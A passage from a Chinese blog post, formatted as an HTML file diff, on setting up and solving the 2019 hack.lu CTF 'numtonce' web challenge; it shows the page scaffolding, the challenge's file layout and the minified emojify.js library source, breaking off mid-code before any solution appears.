@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言2019hack.luCTF的numtonce的环境搭建到解决的详细过程 0x01 题目的目录结构如下： app目录下： emojis目录下全是图片就不分析了。  emojis.min.js文件的内容如下： 1234/*! emojify.js - v1.1.0 -  * Copyright (c) Hassan Khan 2015 */!function(e,a)&amp;#123;&quot;use str">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019hack.luCTF的numtonce的环境搭建到解决的详细过程">
+<meta property="og:url" content="http://yoursite.com/2019/12/21/2019hack-luCTF的numtonce的环境搭建到解决的详细过程/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言2019hack.luCTF的numtonce的环境搭建到解决的详细过程 0x01 题目的目录结构如下： app目录下： emojis目录下全是图片就不分析了。  emojis.min.js文件的内容如下： 1234/*! emojify.js - v1.1.0 -  * Copyright (c) Hassan Khan 2015 */!function(e,a)&amp;#123;&quot;use str">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019hack.luCTF-numtonce-1.PNG">
+<meta property="og:updated_time" content="2019-12-21T09:13:54.625Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019hack.luCTF的numtonce的环境搭建到解决的详细过程">
+<meta name="twitter:description" content="前言2019hack.luCTF的numtonce的环境搭建到解决的详细过程 0x01 题目的目录结构如下： app目录下： emojis目录下全是图片就不分析了。  emojis.min.js文件的内容如下： 1234/*! emojify.js - v1.1.0 -  * Copyright (c) Hassan Khan 2015 */!function(e,a)&amp;#123;&quot;use str">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019hack.luCTF-numtonce-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/21/2019hack-luCTF的numtonce的环境搭建到解决的详细过程/">
+
+
+
+
+
+  <title>2019hack.luCTF的numtonce的环境搭建到解决的详细过程 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/21/2019hack-luCTF的numtonce的环境搭建到解决的详细过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019hack.luCTF的numtonce的环境搭建到解决的详细过程</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-21T17:13:02+08:00">
+                2019-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/javascript-web/" itemprop="url" rel="index">
+                    <span itemprop="name">javascript-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  20
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2019hack.luCTF的numtonce的环境搭建到解决的详细过程</p>
+<h5 id="0x01-题目的目录结构如下："><a href="#0x01-题目的目录结构如下：" class="headerlink" title="0x01 题目的目录结构如下："></a>0x01 题目的目录结构如下：</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019hack.luCTF-numtonce-1.PNG" alt></p>
+<h6 id="app目录下："><a href="#app目录下：" class="headerlink" title="app目录下："></a><code>app</code>目录下：</h6><ul>
+<li><p><code>emojis</code>目录下全是图片就不分析了。</p>
+</li>
+<li><p><code>emojis.min.js</code>文件的内容如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*! emojify.js - v1.1.0 - </span></span><br><span class="line"><span class="comment"> * Copyright (c) Hassan Khan 2015</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,a</span>)</span>&#123;<span class="string">"use strict"</span>;<span class="string">"function"</span>==<span class="keyword">typeof</span> define&amp;&amp;define.amd?define([],a):<span class="string">"object"</span>==<span class="keyword">typeof</span> exports?<span class="built_in">module</span>.exports=a():e.emojify=a()&#125;(<span class="keyword">this</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="string">"use strict"</span>;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> e=&#123;<span class="attr">named</span>:<span class="regexp">/:([a-z0-9A-Z_-]+):/</span>,<span class="attr">smile</span>:<span class="regexp">/:-?\)/g</span>,<span class="attr">open_mouth</span>:<span class="regexp">/:o/gi</span>,<span class="attr">scream</span>:<span class="regexp">/:-o/gi</span>,<span class="attr">smirk</span>:<span class="regexp">/[:;]-?]/g</span>,<span class="attr">grinning</span>:<span class="regexp">/[:;]-?d/gi</span>,<span class="attr">stuck_out_tongue_closed_eyes</span>:<span class="regexp">/x-d/gi</span>,<span class="attr">stuck_out_tongue_winking_eye</span>:<span class="regexp">/[:;]-?p/gi</span>,<span class="attr">rage</span>:<span class="regexp">/:-?[\[@]/g</span>,<span class="attr">frowning</span>:<span class="regexp">/:-?\(/g</span>,<span class="attr">sob</span>:<span class="regexp">/:['’]-?\(|:&amp;#x27;\(/g</span>,<span class="attr">kissing_heart</span>:<span class="regexp">/:-?\*/g</span>,<span class="attr">wink</span>:<span class="regexp">/;-?\)/g</span>,<span class="attr">pensive</span>:<span class="regexp">/:-?\//g</span>,<span class="attr">confounded</span>:<span class="regexp">/:-?s/gi</span>,<span class="attr">flushed</span>:<span class="regexp">/:-?\|/g</span>,<span class="attr">relaxed</span>:<span class="regexp">/:-?\$/g</span>,<span class="attr">mask</span>:<span class="regexp">/:-x/gi</span>,<span class="attr">heart</span>:<span class="regexp">/&lt;3|&amp;lt;3/g</span>,<span class="attr">broken_heart</span>:<span class="regexp">/&lt;\/3|&amp;lt;&amp;#x2F;3/g</span>,<span class="attr">thumbsup</span>:<span class="regexp">/:\+1:/g</span>,<span class="attr">thumbsdown</span>:<span class="regexp">/:\-1:/g</span>&#125;;<span class="keyword">return</span> d.ignore_emoticons&amp;&amp;(e=&#123;<span class="attr">named</span>:<span class="regexp">/:([a-z0-9A-Z_-]+):/</span>,<span class="attr">thumbsup</span>:<span class="regexp">/:\+1:/g</span>,<span class="attr">thumbsdown</span>:<span class="regexp">/:\-1:/g</span>&#125;),<span class="built_in">Object</span>.keys(e).map(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span>[e[a],a]&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> e=_.map(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=e[<span class="number">0</span>],o=a.source||a;<span class="keyword">return</span> o=o.replace(<span class="regexp">/(^|[^\[])\^/g</span>,<span class="string">"$1"</span>),<span class="string">"("</span>+o+<span class="string">")"</span>&#125;).join(<span class="string">"|"</span>);<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(e,<span class="string">"gi"</span>)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span><span class="string">" "</span>===e||<span class="string">"	"</span>===e||<span class="string">"\r"</span>===e||<span class="string">"\n"</span>===e||<span class="string">""</span>===e||e===<span class="built_in">String</span>.fromCharCode(<span class="number">160</span>)&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=<span class="literal">null</span>;<span class="keyword">if</span>(e.replacer)a=e.replacer.apply(&#123;<span class="attr">config</span>:d&#125;,[<span class="string">":"</span>+e.emojiName+<span class="string">":"</span>,e.emojiName]);<span class="keyword">else</span>&#123;<span class="keyword">var</span> o=d.tag_type||h[d.mode];a=e.win.document.createElement(o),<span class="string">"img"</span>!==o?a.setAttribute(<span class="string">"class"</span>,<span class="string">"emoji emoji-"</span>+e.emojiName):(a.setAttribute(<span class="string">"align"</span>,<span class="string">"absmiddle"</span>),a.setAttribute(<span class="string">"alt"</span>,<span class="string">":"</span>+e.emojiName+<span class="string">":"</span>),a.setAttribute(<span class="string">"class"</span>,<span class="string">"emoji"</span>),a.setAttribute(<span class="string">"src"</span>,d.img_dir+<span class="string">"/"</span>+e.emojiName+<span class="string">".png"</span>)),a.setAttribute(<span class="string">"title"</span>,<span class="string">":"</span>+e.emojiName+<span class="string">":"</span>)&#125;e.node.splitText(e.match.index),e.node.nextSibling.nodeValue=e.node.nextSibling.nodeValue.substr(e.match[<span class="number">0</span>].length,e.node.nextSibling.nodeValue.length),a.appendChild(e.node.splitText(e.match.index)),e.node.parentNode.insertBefore(a,e.node.nextSibling)&#125;<span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">if</span>(e[<span class="number">1</span>]&amp;&amp;e[<span class="number">2</span>])&#123;<span class="keyword">var</span> a=e[<span class="number">2</span>];<span class="keyword">if</span>(m[a])<span class="keyword">return</span> a&#125;<span class="keyword">else</span> <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">3</span>;o&lt;e.length<span class="number">-1</span>;o++)<span class="keyword">if</span>(e[o])<span class="keyword">return</span> _[o<span class="number">-2</span>][<span class="number">1</span>]&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e,a</span>)</span>&#123;<span class="keyword">var</span> o=<span class="keyword">this</span>.config.tag_type||h[<span class="keyword">this</span>.config.mode];<span class="keyword">return</span><span class="string">"img"</span>!==o?<span class="string">"&lt;"</span>+o+<span class="string">" class='emoji emoji-"</span>+a+<span class="string">"' title=':"</span>+a+<span class="string">":'&gt;&lt;/"</span>+o+<span class="string">"&gt;"</span>:<span class="string">"&lt;img align='absmiddle' alt=':"</span>+a+<span class="string">":' class='emoji' src='"</span>+<span class="keyword">this</span>.config.img_dir+<span class="string">"/"</span>+a+<span class="string">".png' title=':"</span>+a+<span class="string">":' /&gt;"</span>&#125;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;<span class="keyword">this</span>.lastEmojiTerminatedAt=<span class="number">-1</span>&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">o,r</span>)</span>&#123;<span class="keyword">if</span>(!o)<span class="keyword">return</span> o;r||(r=i),_=e(),c=a();<span class="keyword">var</span> t=<span class="keyword">new</span> n;<span class="keyword">return</span> o.replace(c,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> e=<span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>,<span class="number">0</span>,<span class="number">-2</span>),a=<span class="built_in">arguments</span>[<span class="built_in">arguments</span>.length<span class="number">-2</span>],o=<span class="built_in">arguments</span>[<span class="built_in">arguments</span>.length<span class="number">-1</span>],i=t.validate(e,a,o);<span class="keyword">return</span> i?r.apply(&#123;<span class="attr">config</span>:d&#125;,[<span class="built_in">arguments</span>[<span class="number">0</span>],i]):<span class="built_in">arguments</span>[<span class="number">0</span>]&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">o,i</span>)</span>&#123;<span class="string">"undefined"</span>==<span class="keyword">typeof</span> o&amp;&amp;(o=d.only_crawl_id?<span class="built_in">document</span>.getElementById(d.only_crawl_id):<span class="built_in">document</span>.body);<span class="keyword">var</span> s=o.ownerDocument,l=s.defaultView||s.parentWindow,u=<span class="function"><span class="keyword">function</span>(<span class="params">e,a</span>)</span>&#123;<span class="keyword">var</span> o;<span class="keyword">if</span>(e.hasChildNodes())<span class="keyword">for</span>(o=e.firstChild;o;)a(o)&amp;&amp;u(o,a),o=o.nextSibling&#125;,g=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a,o=[],s=<span class="keyword">new</span> n;<span class="literal">null</span>!==(a=c.exec(e.data));)s.validate(a,a.index,a.input)&amp;&amp;o.push(a);<span class="keyword">for</span>(<span class="keyword">var</span> _=o.length;_--&gt;<span class="number">0</span>;)&#123;<span class="keyword">var</span> u=t(o[_]);r(&#123;<span class="attr">node</span>:e,<span class="attr">match</span>:o[_],<span class="attr">emojiName</span>:u,<span class="attr">replacer</span>:i,<span class="attr">win</span>:l&#125;)&#125;&#125;;_=e(),c=a();<span class="keyword">var</span> m=[],h=<span class="keyword">new</span> <span class="built_in">RegExp</span>(d.blacklist.elements.join(<span class="string">"|"</span>),<span class="string">"i"</span>),p=<span class="keyword">new</span> <span class="built_in">RegExp</span>(d.blacklist.classes.join(<span class="string">"|"</span>),<span class="string">"i"</span>);<span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> l.document.createTreeWalker)<span class="keyword">for</span>(<span class="keyword">var</span> b,f=l.document.createTreeWalker(o,l.NodeFilter.SHOW_TEXT|l.NodeFilter.SHOW_ELEMENT,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> <span class="number">1</span>!==e.nodeType?l.NodeFilter.FILTER_ACCEPT:e.tagName.match(h)||<span class="string">"svg"</span>===e.tagName||e.className.match(p)?l.NodeFilter.FILTER_REJECT:l.NodeFilter.FILTER_SKIP&#125;,!<span class="number">1</span>);<span class="literal">null</span>!==(b=f.nextNode());)m.push(b);<span class="keyword">else</span> u(o,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span><span class="string">"undefined"</span>!=<span class="keyword">typeof</span> e.tagName&amp;&amp;e.tagName.match(h)||<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> e.className&amp;&amp;e.className.match(p)?!<span class="number">1</span>:<span class="number">1</span>===e.nodeType?!<span class="number">0</span>:(m.push(e),!<span class="number">0</span>)&#125;);m.forEach(g)&#125;<span class="keyword">var</span> _,c,u=<span class="string">"+1,-1,100,1234,8ball,a,ab,abc,abcd,accept,aerial_tramway,airplane,alarm_clock,alien,ambulance,anchor,angel,anger,angry,anguished,ant,apple,aquarius,aries,arrow_backward,arrow_double_down,arrow_double_up,arrow_down,arrow_down_small,arrow_forward,arrow_heading_down,arrow_heading_up,arrow_left,arrow_lower_left,arrow_lower_right,arrow_right,arrow_right_hook,arrow_up,arrow_up_down,arrow_up_small,arrow_upper_left,arrow_upper_right,arrows_clockwise,arrows_counterclockwise,art,articulated_lorry,astonished,atm,b,baby,baby_bottle,baby_chick,baby_symbol,back,baggage_claim,balloon,ballot_box_with_check,bamboo,banana,bangbang,bank,bar_chart,barber,baseball,basketball,bath,bathtub,battery,bear,bee,beer,beers,beetle,beginner,bell,bento,bicyclist,bike,bikini,bird,birthday,black_circle,black_joker,black_medium_small_square,black_medium_square,black_nib,black_small_square,black_square,black_square_button,blossom,blowfish,blue_book,blue_car,blue_heart,blush,boar,boat,bomb,book,bookmark,bookmark_tabs,books,boom,boot,bouquet,bow,bowling,bowtie,boy,bread,bride_with_veil,bridge_at_night,briefcase,broken_heart,bug,bulb,bullettrain_front,bullettrain_side,bus,busstop,bust_in_silhouette,busts_in_silhouette,cactus,cake,calendar,calling,camel,camera,cancer,candy,capital_abcd,capricorn,car,card_index,carousel_horse,cat,cat2,cd,chart,chart_with_downwards_trend,chart_with_upwards_trend,checkered_flag,cherries,cherry_blossom,chestnut,chicken,children_crossing,chocolate_bar,christmas_tree,church,cinema,circus_tent,city_sunrise,city_sunset,cl,clap,clapper,clipboard,clock1,clock10,clock1030,clock11,clock1130,clock12,clock1230,clock130,clock2,clock230,clock3,clock330,clock4,clock430,clock5,clock530,clock6,clock630,clock7,clock730,clock8,clock830,clock9,clock930,closed_book,closed_lock_with_key,closed_umbrella,cloud,clubs,cn,cocktail,coffee,cold_sweat,collision,computer,confetti_ball,confounded,confused,congratulations,construction,construction_worker,convenience_store,cookie,cool,cop,copyright,corn,couple,couple_with_heart,couplekiss,cow,cow2,credit_card,crescent_moon,crocodile,crossed_flags,crown,cry,crying_cat_face,crystal_ball,cupid,curly_loop,currency_exchange,curry,custard,customs,cyclone,dancer,dancers,dango,dart,dash,date,de,deciduous_tree,department_store,diamond_shape_with_a_dot_inside,diamonds,disappointed,disappointed_relieved,dizzy,dizzy_face,do_not_litter,dog,dog2,dollar,dolls,dolphin,donut,door,doughnut,dragon,dragon_face,dress,dromedary_camel,droplet,dvd,e-mail,ear,ear_of_rice,earth_africa,earth_americas,earth_asia,egg,eggplant,eight,eight_pointed_black_star,eight_spoked_asterisk,electric_plug,elephant,email,end,envelope,es,euro,european_castle,european_post_office,evergreen_tree,exclamation,expressionless,eyeglasses,eyes,facepunch,factory,fallen_leaf,family,fast_forward,fax,fearful,feelsgood,feet,ferris_wheel,file_folder,finnadie,fire,fire_engine,fireworks,first_quarter_moon,first_quarter_moon_with_face,fish,fish_cake,fishing_pole_and_fish,fist,five,flags,flashlight,floppy_disk,flower_playing_cards,flushed,foggy,football,fork_and_knife,fountain,four,four_leaf_clover,fr,free,fried_shrimp,fries,frog,frowning,fu,fuelpump,full_moon,full_moon_with_face,game_die,gb,gem,gemini,ghost,gift,gift_heart,girl,globe_with_meridians,goat,goberserk,godmode,golf,grapes,green_apple,green_book,green_heart,grey_exclamation,grey_question,grimacing,grin,grinning,guardsman,guitar,gun,haircut,hamburger,hammer,hamster,hand,handbag,hankey,hash,hatched_chick,hatching_chick,headphones,hear_no_evil,heart,heart_decoration,heart_eyes,heart_eyes_cat,heartbeat,heartpulse,hearts,heavy_check_mark,heavy_division_sign,heavy_dollar_sign,heavy_exclamation_mark,heavy_minus_sign,heavy_multiplication_x,heavy_plus_sign,helicopter,herb,hibiscus,high_brightness,high_heel,hocho,honey_pot,honeybee,horse,horse_racing,hospital,hotel,hotsprings,hourglass,hourglass_flowing_sand,house,house_with_garden,hurtrealbad,hushed,ice_cream,icecream,id,ideograph_advantage,imp,inbox_tray,incoming_envelope,information_desk_person,information_source,innocent,interrobang,iphone,it,izakaya_lantern,jack_o_lantern,japan,japanese_castle,japanese_goblin,japanese_ogre,jeans,joy,joy_cat,jp,key,keycap_ten,kimono,kiss,kissing,kissing_cat,kissing_closed_eyes,kissing_face,kissing_heart,kissing_smiling_eyes,koala,koko,kr,large_blue_circle,large_blue_diamond,large_orange_diamond,last_quarter_moon,last_quarter_moon_with_face,laughing,leaves,ledger,left_luggage,left_right_arrow,leftwards_arrow_with_hook,lemon,leo,leopard,libra,light_rail,link,lips,lipstick,lock,lock_with_ink_pen,lollipop,loop,loudspeaker,love_hotel,love_letter,low_brightness,m,mag,mag_right,mahjong,mailbox,mailbox_closed,mailbox_with_mail,mailbox_with_no_mail,man,man_with_gua_pi_mao,man_with_turban,mans_shoe,maple_leaf,mask,massage,meat_on_bone,mega,melon,memo,mens,metal,metro,microphone,microscope,milky_way,minibus,minidisc,mobile_phone_off,money_with_wings,moneybag,monkey,monkey_face,monorail,mortar_board,mount_fuji,mountain_bicyclist,mountain_cableway,mountain_railway,mouse,mouse2,movie_camera,moyai,muscle,mushroom,musical_keyboard,musical_note,musical_score,mute,nail_care,name_badge,neckbeard,necktie,negative_squared_cross_mark,neutral_face,new,new_moon,new_moon_with_face,newspaper,ng,nine,no_bell,no_bicycles,no_entry,no_entry_sign,no_good,no_mobile_phones,no_mouth,no_pedestrians,no_smoking,non-potable_water,nose,notebook,notebook_with_decorative_cover,notes,nut_and_bolt,o,o2,ocean,octocat,octopus,oden,office,ok,ok_hand,ok_woman,older_man,older_woman,on,oncoming_automobile,oncoming_bus,oncoming_police_car,oncoming_taxi,one,open_file_folder,open_hands,open_mouth,ophiuchus,orange_book,outbox_tray,ox,package,page_facing_up,page_with_curl,pager,palm_tree,panda_face,paperclip,parking,part_alternation_mark,partly_sunny,passport_control,paw_prints,peach,pear,pencil,pencil2,penguin,pensive,performing_arts,persevere,person_frowning,person_with_blond_hair,person_with_pouting_face,phone,pig,pig2,pig_nose,pill,pineapple,pisces,pizza,plus1,point_down,point_left,point_right,point_up,point_up_2,police_car,poodle,poop,post_office,postal_horn,postbox,potable_water,pouch,poultry_leg,pound,pouting_cat,pray,princess,punch,purple_heart,purse,pushpin,put_litter_in_its_place,question,rabbit,rabbit2,racehorse,radio,radio_button,rage,rage1,rage2,rage3,rage4,railway_car,rainbow,raised_hand,raised_hands,raising_hand,ram,ramen,rat,recycle,red_car,red_circle,registered,relaxed,relieved,repeat,repeat_one,restroom,revolving_hearts,rewind,ribbon,rice,rice_ball,rice_cracker,rice_scene,ring,rocket,roller_coaster,rooster,rose,rotating_light,round_pushpin,rowboat,ru,rugby_football,runner,running,running_shirt_with_sash,sa,sagittarius,sailboat,sake,sandal,santa,satellite,satisfied,saxophone,school,school_satchel,scissors,scorpius,scream,scream_cat,scroll,seat,secret,see_no_evil,seedling,seven,shaved_ice,sheep,shell,ship,shipit,shirt,shit,shoe,shower,signal_strength,six,six_pointed_star,ski,skull,sleeping,sleepy,slot_machine,small_blue_diamond,small_orange_diamond,small_red_triangle,small_red_triangle_down,smile,smile_cat,smiley,smiley_cat,smiling_imp,smirk,smirk_cat,smoking,snail,snake,snowboarder,snowflake,snowman,sob,soccer,soon,sos,sound,space_invader,spades,spaghetti,sparkle,sparkler,sparkles,sparkling_heart,speak_no_evil,speaker,speech_balloon,speedboat,squirrel,star,star2,stars,station,statue_of_liberty,steam_locomotive,stew,straight_ruler,strawberry,stuck_out_tongue,stuck_out_tongue_closed_eyes,stuck_out_tongue_winking_eye,sun_with_face,sunflower,sunglasses,sunny,sunrise,sunrise_over_mountains,surfer,sushi,suspect,suspension_railway,sweat,sweat_drops,sweat_smile,sweet_potato,swimmer,symbols,syringe,tada,tanabata_tree,tangerine,taurus,taxi,tea,telephone,telephone_receiver,telescope,tennis,tent,thought_balloon,three,thumbsdown,thumbsup,ticket,tiger,tiger2,tired_face,tm,toilet,tokyo_tower,tomato,tongue,top,tophat,tractor,traffic_light,train,train2,tram,triangular_flag_on_post,triangular_ruler,trident,triumph,trolleybus,trollface,trophy,tropical_drink,tropical_fish,truck,trumpet,tshirt,tulip,turtle,tv,twisted_rightwards_arrows,two,two_hearts,two_men_holding_hands,two_women_holding_hands,u5272,u5408,u55b6,u6307,u6708,u6709,u6e80,u7121,u7533,u7981,u7a7a,uk,umbrella,unamused,underage,unlock,up,us,v,vertical_traffic_light,vhs,vibration_mode,video_camera,video_game,violin,virgo,volcano,vs,walking,waning_crescent_moon,waning_gibbous_moon,warning,watch,water_buffalo,watermelon,wave,wavy_dash,waxing_crescent_moon,waxing_gibbous_moon,wc,weary,wedding,whale,whale2,wheelchair,white_check_mark,white_circle,white_flower,white_large_square,white_medium_small_square,white_medium_square,white_small_square,white_square_button,wind_chime,wine_glass,wink,wolf,woman,womans_clothes,womans_hat,womens,worried,wrench,x,yellow_heart,yen,yum,zap,zero,zzz"</span>,g=u.split(<span class="regexp">/,/</span>),m=g.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">e,a</span>)</span>&#123;<span class="keyword">return</span> e[a]=!<span class="number">0</span>,e&#125;,&#123;&#125;),d=&#123;<span class="attr">blacklist</span>:&#123;<span class="attr">ids</span>:[],<span class="attr">classes</span>:[<span class="string">"no-emojify"</span>],<span class="attr">elements</span>:[<span class="string">"script"</span>,<span class="string">"textarea"</span>,<span class="string">"a"</span>,<span class="string">"pre"</span>,<span class="string">"code"</span>]&#125;,<span class="attr">tag_type</span>:<span class="literal">null</span>,<span class="attr">only_crawl_id</span>:<span class="literal">null</span>,<span class="attr">img_dir</span>:<span class="string">"images/emoji"</span>,<span class="attr">ignore_emoticons</span>:!<span class="number">1</span>,<span class="attr">mode</span>:<span class="string">"img"</span>&#125;,h=&#123;<span class="attr">img</span>:<span class="string">"img"</span>,<span 